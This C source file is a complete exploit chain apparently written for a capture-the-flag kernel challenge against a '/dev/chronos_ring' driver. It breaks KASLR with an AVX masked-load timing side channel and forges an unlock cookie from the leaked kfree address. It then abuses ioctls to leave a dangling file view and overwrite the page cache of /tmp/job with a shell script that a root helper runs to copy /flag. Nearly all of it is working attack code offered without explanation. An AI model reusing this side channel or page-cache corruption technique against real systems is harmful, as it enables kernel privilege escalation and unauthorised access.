#define _GNU_SOURCE
#include <fcntl.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <x86intrin.h>

// --- KASLR 侧信道偏移配置 ---
#define KFREE_OFFSET 0x3762b0

// --- IOCTL 定义 ---
#define CHRONOS_REG_BUF 0x1001
#define CHRONOS_SET_OPTS 0x1002
#define CHRONOS_PIN_USER_PAGE 0x1003
#define CHRONOS_ATTACH_FILE 0x1004
#define CHRONOS_ENABLE_SYNC 0x1005
#define CHRONOS_DETACH_FILE 0x1006
#define CHRONOS_UPDATE_BUF 0x1007
#define CHRONOS_COMMIT_SYNC 0x1008

struct chronos_set_opts_req {
  uint64_t cookie;
  uint32_t session_idx;
};
struct chronos_file_req {
  int32_t fd;
  uint32_t page_index;
};
struct chronos_update_req {
  uint64_t user_buf;
  uint32_t len;
  uint32_t off;
};

static inline uint64_t rol64(uint64_t word, unsigned int shift) {
  return (word << shift) | (word >> (64 - shift));
}

void die(const char *msg) {
  perror(msg);
  exit(EXIT_FAILURE);
}

// ==============================================================
// KASLR SIDE-CHANNEL START (from zolutal's AVX timing channel)
// ==============================================================

#define ASM_INTEL(asm_code)                                                    \
  __asm__(".intel_syntax noprefix;" asm_code ".att_syntax prefix;")

#define ASM_FUNC(func_name, instructions)                                      \
  ASM_INTEL(".section .text;"                                                  \
            ".global " #func_name ";"                                          \
            ".type " #func_name ", @function;" #func_name ":" instructions);

uint64_t time_masked_avx(void *addr);
ASM_FUNC(time_masked_avx, "push rbp;"
                          "push rbx;"
                          "push rdx;"
                          "sub rsp, 32;"
                          "movdqa [rsp], xmm0;"
                          "movdqa [rsp + 16], xmm2;"
                          "movaps xmm2, xmm0;"
                          "xorps xmm2, xmm2;"
                          "lfence;"
                          "rdtsc;"
                          "shl rdx, 32;"
                          "or rdx, rax;"
                          "mov rbx, rdx;"
                          "vmaskmovps xmm1, xmm2, [rdi];"
                          "lfence;"
                          "rdtsc;"
                          "shl rdx, 32;"
                          "or rdx, rax;"
                          "sub rdx, rbx;"
                          "mov rax, rdx;"
                          "movdqa xmm0, [rsp];"
                          "movdqa xmm2, [rsp + 16];"
                          "add rsp, 32;"
                          "pop rdx;"
                          "pop rbx;"
                          "pop rbp;"
                          "ret;");

uint64_t probe_ktext(uint64_t offset) {
  const uint64_t kernel_lower_bound = 0xffffffff80000000;
  const uint64_t kernel_upper_bound = 0xffffffffc0000000;
  const uint64_t step = 0x100000;
  const int dummy_iterations = 5;
  const int iterations = 100;
  const int arr_size = (kernel_upper_bound - kernel_lower_bound) / step;

  uint64_t scan_start = kernel_lower_bound;
  uint64_t *data = (uint64_t *)malloc(arr_size * sizeof(uint64_t));
  memset(data, 0, arr_size * sizeof(uint64_t));
  uint64_t min = ~0, addr = ~0;

  for (int i = 0; i < iterations + dummy_iterations; i++) {
    for (uint64_t idx = 0; idx < arr_size; idx++) {
      uint64_t test = scan_start + idx * step;
      syscall(104); // dummy serializing syscall
      uint64_t time = time_masked_avx((void *)test);
      if (i >= dummy_iterations)
        data[idx] += time;
    }
  }

  for (int i = 0; i < arr_size; i++) {
    data[i] /= iterations;
    if (data[i] < min) {
      min = data[i];
      addr = scan_start + i * step;
    }
  }
  free(data);
  return addr - offset;
}

uint64_t break_kaslr_text() {
  printf("[*] Starting AVX masked load side-channel attack...\n");
  uint64_t base = -1;
  for (int i = 0; i < 5; i++) {
    uint64_t potential = probe_ktext(0);
    if (potential < base) {
      base = potential;
    }
  }
  if (base < 0xffffffff80000000) {
    printf("[-] KASLR side-channel failed! Timing might be unstable.\n");
    exit(1);
  }
  return base;
}

// ==============================================================
// MAIN EXPLOIT LOGIC
// ==============================================================

int main() {
  int fd;
  uint64_t kbase, kfree_addr, material, cookie;
  uint32_t session_idx = 0x1337;

  printf("=======================================\n");
  printf("[*] Chronos Ring Full Exploit Chain\n");
  printf("=======================================\n");

  fd = open("/dev/chronos_ring", O_RDWR);
  if (fd < 0)
    die("[-] open /dev/chronos_ring failed");

  uint64_t raw_leak = break_kaslr_text();
  printf("[+] Raw Side-Channel Leak: 0x%lx\n", raw_leak);

  kbase = raw_leak - 0x1600000;
  printf("[+] Adjusted Kernel Text Base: 0x%lx\n", kbase);

  kfree_addr = kbase + KFREE_OFFSET;
  printf("[+] Calculated kfree addr:   0x%lx\n", kfree_addr);

  material = kfree_addr >> 21;
  cookie = rol64(material ^ 0x9e3779b97f4a7c15ULL, 17) ^ session_idx;
  printf("[+] Calculated Cookie:       0x%lx\n", cookie);

  struct chronos_set_opts_req opts_req = {.cookie = cookie,
                                          .session_idx = session_idx};
  if (ioctl(fd, CHRONOS_SET_OPTS, &opts_req) < 0)
    die("[-] Gate unlock failed! Bad KASLR leak?");
  printf("[+] Gate unlocked successfully!\n");

  ioctl(fd, CHRONOS_REG_BUF);

  void *pin_addr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  *(uint64_t *)pin_addr = 0xdeadbeef;
  ioctl(fd, CHRONOS_PIN_USER_PAGE, &pin_addr);

  int target_fd = open("/tmp/job", O_RDONLY);
  struct chronos_file_req file_req = {.fd = target_fd, .page_index = 0};
  ioctl(fd, CHRONOS_ATTACH_FILE, &file_req);

  ioctl(fd, CHRONOS_ENABLE_SYNC);
  ioctl(fd, CHRONOS_DETACH_FILE);
  printf("[!] File detached. Stale view dangling!\n");

  char payload[] = "#!/bin/sh\n"
                   "cp /flag /tmp/flag\n"
                   "chmod 777 /tmp/flag\n"
                   "exit\n\n\n\n\n\n\n\n";
  struct chronos_update_req update_req = {
      .user_buf = (uint64_t)payload, .len = sizeof(payload), .off = 0};

  ioctl(fd, CHRONOS_UPDATE_BUF, &update_req);
  ioctl(fd, CHRONOS_COMMIT_SYNC, &update_req);
  printf("[*] Page cache corrupted! Wait for Root Helper...\n");

  sleep(4);
  system("cat /tmp/flag");

  return 0;
}